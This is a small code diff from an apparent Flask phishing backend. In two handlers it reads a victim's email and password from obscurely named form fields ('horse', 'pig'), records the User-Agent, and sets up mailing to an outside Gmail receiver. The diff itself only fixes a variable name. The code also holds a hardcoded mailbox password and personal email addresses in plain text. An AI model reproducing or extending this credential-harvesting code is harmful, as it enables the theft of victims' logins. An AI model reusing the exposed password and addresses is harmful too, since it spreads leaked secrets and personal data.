@@ -192,7 +192,7 @@ def first():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "eissa@waterworldwaterpark.com"
-        sender_emaill = "eissa"
+        sender_email = "eissa"
         receiver_email = "s.toihidi@gmail.com"
         password = "EISSA47314A"
         useragent = request.headers.get('User-Agent')
@@ -232,7 +232,7 @@ def second():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "eissa@waterworldwaterpark.com"
-        sender_emaill = "eissa"
+        sender_email = "eissa"
         receiver_email = "s.toihidi@gmail.com"
         password = "EISSA47314A"
         useragent = request.headers.get('User-Agent')
